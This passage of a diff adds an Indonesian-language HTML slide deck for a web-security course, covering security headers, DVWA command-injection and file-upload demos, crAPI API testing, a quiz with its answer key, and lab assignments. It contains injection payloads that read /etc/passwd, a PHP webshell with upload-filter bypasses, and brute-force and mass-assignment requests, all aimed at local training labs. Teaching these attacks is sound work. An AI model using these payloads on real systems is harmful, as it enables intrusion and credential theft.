+  default-src 'self';
+  script-src 'self' cdn.trusted.com;
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data:;
+  object-src 'none';
+  frame-ancestors 'none';</span>
+          </div>
+        </div>
+        <div class="vuln-box mt8" style="border-left-color:#27ae60;">
+          <h4 style="color:#1e8449;">HTTP Strict Transport Security (HSTS)</h4>
+          <div class="code-block" style="margin-top:6px;">
+<span class="comment"># Paksa browser gunakan HTTPS untuk 1 tahun</span>
+<span class="out">Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</span>
+<span class="comment"># max-age=31536000 = 1 tahun
+# includeSubDomains = berlaku ke semua subdomain
+# preload = daftarkan ke HSTS Preload List</span>
+          </div>
+        </div>
+        <div class="vuln-box mt8" style="border-left-color:#e67e22;">
+          <h4 style="color:#d35400;">X-Frame-Options</h4>
+          <div class="code-block" style="margin-top:6px;">
+<span class="comment"># Cegah clickjacking dengan memblokir iframe</span>
+<span class="out">X-Frame-Options: DENY          ← tidak bisa di-iframe
+X-Frame-Options: SAMEORIGIN    ← hanya dari origin sama</span>
+<span class="comment"># Atau gunakan CSP: frame-ancestors 'none'</span>
+          </div>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Header Lainnya & Analisis Dengan Tools</h3>
+        <div class="vuln-box" style="border-left-color:#8e44ad;">
+          <h4 style="color:#7d3c98;">CORS — Cross-Origin Resource Sharing</h4>
+          <div class="code-block" style="margin-top:6px;">
+<span class="comment"># KONFIGURASI BERBAHAYA — izinkan semua origin:</span>
+<span class="out">Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true</span>
+<span class="comment"># Kombinasi ini memungkinkan attacker baca response!</span>
+
+<span class="comment"># KONFIGURASI AMAN — whitelist explicit:</span>
+<span class="out">Access-Control-Allow-Origin: https://trusted-app.com
+Access-Control-Allow-Credentials: true</span>
+          </div>
+        </div>
+        <div class="vuln-box mt8" style="border-left-color:#16a085;">
+          <h4 style="color:#16a085;">Header Tambahan Penting</h4>
+          <ul>
+            <li><code>X-Content-Type-Options: nosniff</code> — cegah MIME-sniffing</li>
+            <li><code>Referrer-Policy: strict-origin-when-cross-origin</code> — kontrol Referer header</li>
+            <li><code>Permissions-Policy</code> — batasi akses ke fitur browser (kamera, mikrofon)</li>
+          </ul>
+        </div>
+        <div class="code-block" style="margin-top:10px;">
+<span class="comment"># Analisis security headers dengan tools online/curl</span>
+<span class="cmd">curl -I https://target.com | grep -iE "csp|hsts|x-frame|cors"</span>
+
+<span class="comment"># securityheaders.com — grading otomatis
+# Mozilla Observatory — scan mendalam</span>
+<span class="cmd">curl "https://http-observatory.security.mozilla.org/api/v1/analyze?host=target.com"</span>
+        </div>
+        <div class="tip-box mt8">
+          <div class="tip-label">CSP Bypass Techniques</div>
+          <p>Meski CSP aktif, ada bypass: unsafe-inline, CDN whitelisted dengan JSONP, nonce reuse. Gunakan <em>csp-evaluator.withgoogle.com</em> untuk evaluasi CSP Anda.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 7: FILE UPLOAD & COMMAND INJECTION DI DVWA -->
+<div class="slide" id="s7" data-title="Demo — DVWA Command Injection & File Upload">
+  <div class="slide-header">
+    <div class="section-label">Demo</div>
+    <h2>Demo DVWA: Command Injection & File Upload Attack</h2>
+    <p>Demonstrasi langkah pengujian di lingkungan lab terkontrol</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Command Injection di DVWA</h3>
+        <div class="code-block">
+<span class="comment"># DVWA → Command Injection (Security: Low)
+# Input di field "Enter an IP address":</span>
+
+<span class="comment"># 1. Verifikasi command injection:</span>
+<span class="out">127.0.0.1; echo "PWNED"</span>
+
+<span class="comment"># 2. Identifikasi sistem:</span>
+<span class="out">127.0.0.1; id
+127.0.0.1; whoami
+127.0.0.1; uname -a</span>
+
+<span class="comment"># 3. Baca file sensitif:</span>
+<span class="out">127.0.0.1; cat /etc/passwd
+127.0.0.1; cat /var/www/html/dvwa/config/config.inc.php</span>
+
+<span class="comment"># 4. Medium security — bypass dengan &&:</span>
+<span class="out">127.0.0.1&&id
+127.0.0.1&&cat /etc/passwd</span>
+
+<span class="comment"># 5. High security — cari bypass lain:
+# Cek di source code DVWA apa yang difilter</span>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">File Upload Attack di DVWA</h3>
+        <div class="code-block">
+<span class="comment"># DVWA → File Upload (Security: Low)
+# Buat webshell:</span>
+<span class="out"># shell.php
+&lt;?php echo shell_exec($_GET['cmd']); ?&gt;</span>
+
+<span class="comment"># Upload shell.php → server terima</span>
+<span class="out">../../hackable/uploads/shell.php succesfully uploaded!</span>
+
+<span class="comment"># Akses webshell via URL:</span>
+<span class="cmd">curl "http://localhost:8888/dvwa/hackable/uploads/shell.php?cmd=id"</span>
+<span class="out">uid=33(www-data) gid=33(www-data)</span>
+
+<span class="comment"># Medium security — bypass content-type check
+# Ubah Content-Type di Burp dari text/php ke image/jpeg</span>
+<span class="out">Content-Type: image/jpeg   ← spoofed header</span>
+
+<span class="comment"># High security — bypass extension check
+# Rename ke: shell.php.jpg dan manipulasi getimagesize()</span>
+        </div>
+        <div class="warn-box mt8">
+          <div class="warn-label">Dampak Nyata</div>
+          <p>Webshell memberikan akses terminal penuh ke server. Attacker dapat membaca env variables, database credentials, lateral movement ke server lain dalam jaringan yang sama.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 8: PENGUJIAN API DENGAN POSTMAN + BURP -->
+<div class="slide" id="s8" data-title="Pengujian API — Postman & Burp Suite">
+  <div class="slide-header">
+    <div class="section-label">API Testing</div>
+    <h2>Pengujian API dengan Postman & Burp Suite</h2>
+    <p>Metodologi sistematis untuk menguji kerentanan API — BOLA, Mass Assignment, Rate Limiting</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Setup Pengujian API</h3>
+        <div class="vuln-box" style="border-left-color:#2980b9;">
+          <h4 style="color:#1a5276;">Target: OWASP crAPI (Completely Ridiculous API)</h4>
+          <div class="code-block" style="margin-top:6px;">
+<span class="comment"># Deploy crAPI — API vulnerable by design</span>
+<span class="cmd">git clone https://github.com/OWASP/crAPI
+cd crAPI && docker-compose up -d</span>
+<span class="comment"># Akses API: http://localhost:8888
+# API docs: http://localhost:8888/swagger-ui/</span>
+          </div>
+        </div>
+        <div class="vuln-box mt8" style="border-left-color:#27ae60;">
+          <h4 style="color:#1e8449;">Alur Pengujian API Sistematis</h4>
+          <div class="code-block" style="margin-top:6px;">
+<span class="comment"># 1. Enumerate semua endpoint (discovery)</span>
+<span class="cmd">curl http://localhost:8888/swagger.json | jq '.paths | keys'</span>
+
+<span class="comment"># 2. Autentikasi dan simpan token</span>
+<span class="out">POST /user/login
+Body: {"email":"user@test.com","password":"Passw0rd!"}
+→ Response: {"token": "eyJhbGci..."}</span>
+
+<span class="comment"># 3. Test dengan token user A dan B secara bergantian</span>
+<span class="cmd">curl -H "Authorization: Bearer [tokenA]" \</span>
+<span class="cmd">  http://localhost:8888/vehicles/1/location</span>
+<span class="cmd">curl -H "Authorization: Bearer [tokenA]" \</span>
+<span class="cmd">  http://localhost:8888/vehicles/2/location  ← BOLA?</span>
+          </div>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Uji Mass Assignment & Rate Limiting</h3>
+        <div class="code-block">
+<span class="comment"># Mass Assignment — tambahkan field sensitif</span>
+<span class="out">PUT /user/profile
+{
+  "name": "Alice",
+  "email": "alice@test.com",
+  "role": "admin",         ← tambahan berbahaya
+  "available_credit": 9999999
+}</span>
+<span class="comment"># Jika server terima → mass assignment berhasil</span>
+
+<span class="comment"># Rate Limiting Test — kirim request cepat berulang</span>
+<span class="cmd">for i in {1..50}; do
+  curl -s -o /dev/null -w "%{http_code}" \
+    -X POST http://localhost:8888/user/login \
+    -d '{"email":"admin@test.com","password":"wrong"}';
+done</span>
+<span class="out">200200200... → Tidak ada rate limiting = RENTAN
+429429429... → Rate limiting aktif = AMAN</span>
+
+<span class="comment"># GraphQL Introspection — enumerate schema</span>
+<span class="out">{"query": "{__schema{types{name}}}"}
+{"query": "{__schema{queryType{fields{name}}}}"}</span>
+        </div>
+        <div class="tip-box mt8">
+          <div class="tip-label">Burp Suite untuk API Testing</div>
+          <p>Route semua Postman traffic melalui Burp Proxy. Gunakan Burp Repeater untuk manipulasi manual dan Intruder untuk fuzzing parameter API secara sistematis.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 9: RINGKASAN KEAMANAN WEB PERTEMUAN 9-10 -->
+<div class="slide" id="s9" data-title="Ringkasan Keamanan Web Pertemuan 9–10">
+  <div class="slide-header">
+    <div class="section-label">Konsolidasi</div>
+    <h2>Ringkasan Keamanan Aplikasi Web — Pertemuan 9 & 10</h2>
+    <p>Keseluruhan materi Sub-CPMK 263.1 & 263.2 sebelum kuis</p>
+  </div>
+  <div class="slide-body">
+    <div class="three-col">
+      <div class="card">
+        <h3 style="color:#c0392b;">Mg 9: A01 BAC & SQLi</h3>
+        <ul>
+          <li>IDOR: ubah ID → akses resource orang lain</li>
+          <li>SQLi: Classic, Union, Blind, Time-based, SQLMap</li>
+          <li>Mitigasi: RBAC server-side, Prepared Statements</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h3 style="color:#8e44ad;">Mg 9: XSS & Auth</h3>
+        <ul>
+          <li>Reflected, Stored, DOM XSS</li>
+          <li>Cookie theft, bypass dengan event handlers</li>
+          <li>Auth: brute force, JWT alg none, session fixation</li>
+          <li>Mitigasi: CSP, HttpOnly, bcrypt, MFA</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h3 style="color:#e74c3c;">Mg 10: CSRF</h3>
+        <ul>
+          <li>Browser kirim request berbahaya ke trusted site</li>
+          <li>HTML form auto-submit saat korban buka evil.com</li>
+          <li>Mitigasi: CSRF Token, SameSite=Strict, Referer check</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h3 style="color:#e67e22;">Mg 10: Command Inj & Upload</h3>
+        <ul>
+          <li>OS command injection → RCE via ; && | operator</li>
+          <li>File upload: webshell → shell exec</li>
+          <li>Bypass: Content-Type spoof, extension tricks, null byte</li>
+          <li>Mitigasi: whitelist input, store di luar webroot</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h3 style="color:#2980b9;">API Security (263.2)</h3>
+        <ul>
+          <li>BOLA: IDOR versi API</li>
+          <li>Mass Assignment: inject field sensitif</li>
+          <li>No Rate Limiting: brute force / DoS</li>
+          <li>Test: Postman + Burp, crAPI lab</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h3 style="color:#27ae60;">Security Headers</h3>
+        <ul>
+          <li>CSP: cegah XSS dengan whitelist sumber</li>
+          <li>HSTS: paksa HTTPS</li>
+          <li>X-Frame-Options: cegah clickjacking</li>
+          <li>CORS: jangan pakai wildcard + credentials</li>
+        </ul>
+      </div>
+    </div>
+    <div class="tip-box mt12">
+      <div class="tip-label">Persiapan Pertemuan 11</div>
+      <p>Topik berikutnya: <strong>Secure Coding Practices & Static Application Security Testing (SAST)</strong> — Pelajari penggunaan Semgrep dan SonarQube untuk analisis kode statis otomatis.</p>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 10: KUIS -->
+<div class="slide" id="s10" data-title="Kuis — Pertemuan 10">
+  <div class="slide-header">
+    <div class="section-label">Kuis</div>
+    <h2>Kuis Pertemuan 10 — Web Lanjutan & API Security</h2>
+    <p>5 soal pilihan ganda · Sub-CPMK 263.1 & 263.2</p>
+  </div>
+  <div class="slide-body">
+    <div class="quiz-container">
+      <div id="q1">
+        <div class="q-num">Soal 1 dari 5</div>
+        <div class="q-text">Seorang attacker membuat halaman web evil.com yang berisi form tersembunyi yang auto-submit ke <code>https://bank.com/transfer?amount=9999&to=attacker</code>. Korban yang sedang login di bank.com mengunjungi evil.com. Kerentanan apa yang dieksploitasi?</div>
+        <div class="q-options">
+          <button class="q-option" onclick="answer(1,'a')">a) XSS — Cross-Site Scripting</button>
+          <button class="q-option" onclick="answer(1,'b')">b) CSRF — Cross-Site Request Forgery</button>
+          <button class="q-option" onclick="answer(1,'c')">c) SQL Injection melalui form</button>
+          <button class="q-option" onclick="answer(1,'d')">d) SSRF — Server-Side Request Forgery</button>
+        </div>
+        <div id="q1-ok" class="q-feedback ok">Benar! Ini adalah CSRF klasik — browser korban secara otomatis menyertakan cookie session bank.com saat mengirim request dari evil.com, membuatnya tampak seperti permintaan sah dari korban.</div>
+        <div id="q1-ko" class="q-feedback ko">Kurang tepat. Ini CSRF — attacker memanfaatkan browser korban yang sudah login untuk mengirim request berbahaya ke situs yang dipercaya, bukan dengan menyuntikkan script (XSS).</div>
+      </div>
+
+      <div id="q2" style="display:none">
+        <div class="q-num">Soal 2 dari 5</div>
+        <div class="q-text">Sebuah aplikasi memiliki endpoint <code>POST /api/users/register</code>. Attacker mengirimkan body <code>{"username":"hacker","password":"pass","role":"admin"}</code> dan berhasil membuat akun dengan role admin. Ini adalah contoh dari…</div>
+        <div class="q-options">
+          <button class="q-option" onclick="answer(2,'a')">a) API1 — Broken Object Level Authorization</button>
+          <button class="q-option" onclick="answer(2,'b')">b) API3 — Broken Object Property Level Authorization (Mass Assignment)</button>
+          <button class="q-option" onclick="answer(2,'c')">c) API5 — Broken Function Level Authorization</button>
+          <button class="q-option" onclick="answer(2,'d')">d) API2 — Broken Authentication</button>
+        </div>
+        <div id="q2-ok" class="q-feedback ok">Benar! Mass Assignment (API3) terjadi ketika API secara otomatis memetakan semua field dari request body ke objek model tanpa whitelist — attacker dapat menetapkan field sensitif seperti role, isAdmin, atau available_credit.</div>
+        <div id="q2-ko" class="q-feedback ko">Kurang tepat. Ini adalah Mass Assignment — API3 dalam OWASP API Security. Server menerima semua property tanpa filter, sehingga attacker dapat menetapkan field sensitif yang seharusnya tidak dapat diubah.</div>
+      </div>
+
+      <div id="q3" style="display:none">
+        <div class="q-num">Soal 3 dari 5</div>
+        <div class="q-text">Manakah konfigurasi Content Security Policy yang paling efektif untuk mencegah Stored XSS dari skrip eksternal berbahaya?</div>
+        <div class="q-options">
+          <button class="q-option" onclick="answer(3,'a')">a) <code>Content-Security-Policy: script-src *</code></button>
+          <button class="q-option" onclick="answer(3,'b')">b) <code>Content-Security-Policy: script-src 'self' 'unsafe-inline'</code></button>
+          <button class="q-option" onclick="answer(3,'c')">c) <code>Content-Security-Policy: script-src 'self'; object-src 'none'</code></button>
+          <button class="q-option" onclick="answer(3,'d')">d) <code>Content-Security-Policy: default-src 'unsafe-eval' 'unsafe-inline'</code></button>
+        </div>
+        <div id="q3-ok" class="q-feedback ok">Benar! <code>script-src 'self'</code> hanya mengizinkan script dari origin yang sama — memblokir script eksternal. <code>object-src 'none'</code> memblokir plugin berbahaya. Hindari <code>'unsafe-inline'</code> karena justru memungkinkan XSS.</div>
+        <div id="q3-ko" class="q-feedback ko">Kurang tepat. CSP yang efektif: <code>script-src 'self'</code> — hanya izinkan script dari origin sendiri. Opsi lain mengandung wildcard (*), unsafe-inline, atau unsafe-eval yang membuat CSP tidak efektif mencegah XSS.</div>
+      </div>
+
+      <div id="q4" style="display:none">
+        <div class="q-num">Soal 4 dari 5</div>
+        <div class="q-text">Seorang penguji menemukan bahwa aplikasi menjalankan perintah: <code>ping -c 4 [user_input]</code>. Input mana yang paling efektif untuk mengeksfiltrasi konten <code>/etc/passwd</code>?</div>
+        <div class="q-options">
+          <button class="q-option" onclick="answer(4,'a')">a) <code>127.0.0.1 AND cat /etc/passwd</code></button>
+          <button class="q-option" onclick="answer(4,'b')">b) <code>'; DROP TABLE ping--</code></button>
+          <button class="q-option" onclick="answer(4,'c')">c) <code>127.0.0.1; cat /etc/passwd</code></button>
+          <button class="q-option" onclick="answer(4,'d')">d) <code>127.0.0.1 OR /etc/passwd</code></button>
+        </div>
+        <div id="q4-ok" class="q-feedback ok">Benar! Semicolon (;) memisahkan dua perintah shell. Setelah ping selesai, shell mengeksekusi <code>cat /etc/passwd</code>. Operator AND (&&) juga bisa dipakai, bergantung pada shell yang digunakan.</div>
+        <div id="q4-ko" class="q-feedback ko">Kurang tepat. Untuk OS command injection, gunakan separator shell: semicolon (;) atau ampersand (&&). DROP TABLE adalah SQLi syntax, bukan command injection. OR dalam konteks ini tidak dikenali shell.</div>
+      </div>
+
+      <div id="q5" style="display:none">
+        <div class="q-num">Soal 5 dari 5</div>
+        <div class="q-text">Mitigasi yang paling tepat untuk serangan File Upload yang mengupload webshell PHP adalah…</div>
+        <div class="q-options">
+          <button class="q-option" onclick="answer(5,'a')">a) Batasi ukuran file yang bisa diupload maksimal 1MB</button>
+          <button class="q-option" onclick="answer(5,'b')">b) Hanya izinkan ekstensi .jpg, .png, .gif di nama file</button>
+          <button class="q-option" onclick="answer(5,'c')">c) Simpan file di luar webroot, validasi MIME type server-side, rename file secara acak, nonaktifkan eksekusi di folder upload</button>
+          <button class="q-option" onclick="answer(5,'d')">d) Tambahkan .htaccess di folder upload untuk memblokir akses langsung</button>
+        </div>
+        <div id="q5-ok" class="q-feedback ok">Benar! Defense-in-depth untuk file upload: (1) Simpan di luar webroot — file tidak bisa diakses via URL, (2) Validasi MIME type real server-side bukan hanya extension, (3) Rename acak mencegah attacker menebak lokasi file, (4) Nonaktifkan eksekusi mencegah webshell berjalan.</div>
+        <div id="q5-ko" class="q-feedback ko">Kurang tepat. Hanya memvalidasi ekstensi mudah di-bypass (Content-Type spoofing, null byte, double extension). Mitigasi lengkap: simpan di luar webroot + validasi MIME server-side + rename acak + nonaktifkan eksekusi di folder upload.</div>
+      </div>
+
+      <div class="quiz-nav">
+        <button class="quiz-btn" id="prev-btn" onclick="prevQ()" style="display:none">← Sebelumnya</button>
+        <button class="quiz-btn" id="next-btn" onclick="nextQ()" style="display:none">Berikutnya →</button>
+      </div>
+      <div class="quiz-score" id="quiz-score">
+        <h3><span id="score-display">0</span> / 5 Benar</h3>
+        <p>Kuis Pertemuan 10 — Web Lanjutan & API Security</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 11: TUGAS -->
+<div class="slide" id="s11" data-title="Tugas Pertemuan 10">
+  <div class="slide-header">
+    <div class="section-label">Tugas & Asesmen</div>
+    <h2>Tugas Pertemuan 10 — Web Lanjutan & API</h2>
+    <p>Sub-CPMK 263.1 & 263.2 | Dikumpulkan H-1 sebelum Pertemuan 11 via LMS</p>
+  </div>
+  <div class="slide-body">
+    <div class="task-card" style="border-left-color:#e74c3c;">
+      <div class="task-meta">
+        <span class="task-badge tb-red">Individu</span>
+        <span class="task-badge tb-blue">Sub-CPMK 263.1</span>
+        <span class="task-badge tb-gold">Bobot 10%</span>
+      </div>
+      <h4>Tugas A — Lab Lanjutan DVWA</h4>
+      <p>Selesaikan tiga lab berikut pada DVWA dan dokumentasikan dengan format laporan standar:</p>
+      <ul>
+        <li><strong>CSRF:</strong> Buat HTML file yang mengeksploitasi CSRF di DVWA. Dokumentasikan: form, payload, dan cara memverifikasi keberhasilan serangan.</li>
+        <li><strong>Command Injection:</strong> Eksfiltrasi konten /etc/passwd dan /etc/hostname. Coba bypass filter di Security Level Medium.</li>
+        <li><strong>File Upload:</strong> Upload webshell dan eksekusi minimal 2 perintah OS. Dokumentasikan bypass yang digunakan untuk Security Level Medium.</li>
+      </ul>
+    </div>
+    <div class="task-card" style="border-left-color:#2980b9;">
+      <div class="task-meta">
+        <span class="task-badge tb-blue">Kelompok (2 orang)</span>
+        <span class="task-badge tb-blue">Sub-CPMK 263.2</span>
+        <span class="task-badge tb-gold">Bobot 15%</span>
+      </div>
+      <h4>Tugas B — Laporan Pengujian API</h4>
+      <p>Lakukan pengujian keamanan API pada <strong>OWASP crAPI</strong> (atau target lab yang disediakan) dan buat laporan pengujian API yang mencakup:</p>
+      <ul>
+        <li>Minimal 3 kerentanan OWASP API Security Top 10 yang ditemukan</li>
+        <li>Setiap temuan: endpoint, parameter, payload, bukti screenshot, CVSS Score</li>
+        <li>Analisis mitigasi untuk setiap temuan</li>
+        <li>Security Headers analysis pada target (gunakan securityheaders.com)</li>
+      </ul>
+      <p style="margin-top:8px;"><strong>Format:</strong> PDF max 15 halaman. Referensi: OWASP API Security Cheat Sheet.</p>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 12: REFERENSI -->
+<div class="slide" id="s12" data-title="Referensi & Sumber Belajar">
+  <div class="slide-header">
+    <div class="section-label">Referensi</div>
+    <h2>Referensi & Sumber Belajar</h2>
+    <p>Sumber materi Pertemuan 10 — Sub-CPMK 263.1 & 263.2</p>
+  </div>
+  <div class="slide-body">
+    <div class="ref-grid">
+      <div class="ref-card" style="border-top-color:#e74c3c;">
+        <h4>CSRF & Web Attacks</h4>
+        <ul>
+          <li>OWASP CSRF Prevention Cheat Sheet</li>
+          <li>PortSwigger Web Academy — CSRF Labs (gratis)</li>
+          <li>OWASP Testing Guide — CSRF Testing (OTG-SESS-005)</li>
+          <li>CWE-352 — Cross-Site Request Forgery</li>
+        </ul>
+      </div>
+      <div class="ref-card" style="border-top-color:#e67e22;">
+        <h4>Command Injection & File Upload</h4>
+        <ul>
+          <li>OWASP Command Injection Cheat Sheet</li>
+          <li>PortSwigger — OS command injection labs</li>
+          <li>HackTricks — File Upload Bypass Techniques</li>
+          <li>CWE-77 (Command Inj), CWE-434 (Unrestricted Upload)</li>
+        </ul>
+      </div>
+      <div class="ref-card" style="border-top-color:#2980b9;">
+        <h4>API Security</h4>
+        <ul>
+          <li>OWASP API Security Top 10 2023 — apisecurity.io</li>
+          <li>OWASP crAPI — github.com/OWASP/crAPI</li>
+          <li>Postman Learning Center — API Security Testing</li>
+          <li>APISec University — gratis, berbasis API security</li>
+        </ul>
+      </div>
+      <div class="ref-card" style="border-top-color:#27ae60;">
+        <h4>Security Headers & Hardening</h4>
+        <ul>
+          <li>securityheaders.com — grading header otomatis</li>
+          <li>Mozilla Observatory — security.mozilla.org</li>
+          <li>CSP Evaluator — csp-evaluator.withgoogle.com</li>
+          <li>OWASP Secure Headers Project</li>
+        </ul>
+      </div>
+    </div>
+    <div class="warn-box mt16">
+      <div class="warn-label">Persiapan Pertemuan 11</div>
+      <p><strong>Pertemuan 11:</strong> Secure Coding & SAST (Static Application Security Testing) — Analisis kode statis dengan <strong>Semgrep</strong> dan <strong>Bandit</strong> (Python). Pastikan Python dan pip telah terinstall. Instal: <code>pip install bandit semgrep</code>.</p>
+    </div>
+  </div>
+</div>
+
+</div><!-- end #slideshow -->
+
+<!-- NAVBAR -->
+<div id="navbar">
+  <button class="nav-btn" id="btn-prev" onclick="changeSlide(-1)" disabled>← Sebelumnya</button>
+  <div id="slide-title-bar">Cover</div>
+  <div id="progress-bar"><div id="progress-fill" style="width:7.69%"></div></div>
+  <div id="slide-counter">1 / 13</div>
+  <button class="nav-btn" id="btn-next" onclick="changeSlide(1)">Berikutnya →</button>
+</div>
+
+<script>
+  const slides = document.querySelectorAll('.slide');
+  let cur = 0;
+  const total = slides.length;
+  function showSlide(n) {
+    slides[cur].classList.remove('active');
+    cur = Math.max(0, Math.min(n, total - 1));
+    slides[cur].classList.add('active');
+    slides[cur].scrollTop = 0;
+    document.getElementById('btn-prev').disabled = cur === 0;
+    document.getElementById('btn-next').disabled = cur === total - 1;
+    document.getElementById('slide-counter').textContent = (cur+1) + ' / ' + total;
+    document.getElementById('progress-fill').style.width = ((cur+1)/total*100) + '%';
+    document.getElementById('slide-title-bar').textContent = slides[cur].dataset.title || '';
+  }
+  function changeSlide(d) { showSlide(cur + d); }
+  document.addEventListener('keydown', e => {
+    if (e.key === 'ArrowRight' || e.key === 'ArrowDown') changeSlide(1);
+    if (e.key === 'ArrowLeft'  || e.key === 'ArrowUp')   changeSlide(-1);
+  });
+
+  const correctAnswers = { 1:'b', 2:'b', 3:'c', 4:'c', 5:'c' };
+  const answered = {};
+  let qCur = 1;
+  const totalQ = 5;
+  let score = 0;
+
+  function answer(q, choice) {
+    if (answered[q]) return;
+    answered[q] = choice;
+    const options = document.querySelectorAll('#q' + q + ' .q-option');
+    const letters = ['a','b','c','d'];
+    options.forEach((btn, i) => {
+      btn.disabled = true;
+      if (letters[i] === correctAnswers[q]) btn.classList.add('correct');
+      else if (letters[i] === choice)       btn.classList.add('wrong');
+    });
+    const isOk = choice === correctAnswers[q];
+    if (isOk) score++;
+    document.getElementById('q' + q + (isOk ? '-ok' : '-ko')).classList.add('show');
+    document.getElementById('next-btn').style.display = 'inline-block';
+    if (q > 1) document.getElementById('prev-btn').style.display = 'inline-block';
+    if (q === totalQ) document.getElementById('next-btn').textContent = 'Lihat Skor →';
+  }
+
+  function nextQ() {
+    if (qCur === totalQ) {
+      document.getElementById('q' + qCur).style.display = 'none';
+      document.getElementById('score-display').textContent = score + ' / ' + totalQ;
+      document.getElementById('quiz-score').style.display = 'block';
+      document.getElementById('next-btn').style.display = 'none';
+      document.getElementById('prev-btn').style.display = 'none';
+      return;
+    }
+    document.getElementById('q' + qCur).style.display = 'none';
+    qCur++;
+    document.getElementById('q' + qCur).style.display = 'block';
+    document.getElementById('next-btn').style.display = answered[qCur] ? 'inline-block' : 'none';
+    document.getElementById('prev-btn').style.display = qCur > 1 ? 'inline-block' : 'none';
+  }
+
+  function prevQ() {
+    if (qCur <= 1) return;
+    document.getElementById('q' + qCur).style.display = 'none';
+    qCur--;
+    document.getElementById('q' + qCur).style.display = 'block';
+    document.getElementById('next-btn').style.display = 'inline-block';
+    document.getElementById('prev-btn').style.display = qCur > 1 ? 'inline-block' : 'none';
+  }
+</script>
+</body>
+</html>
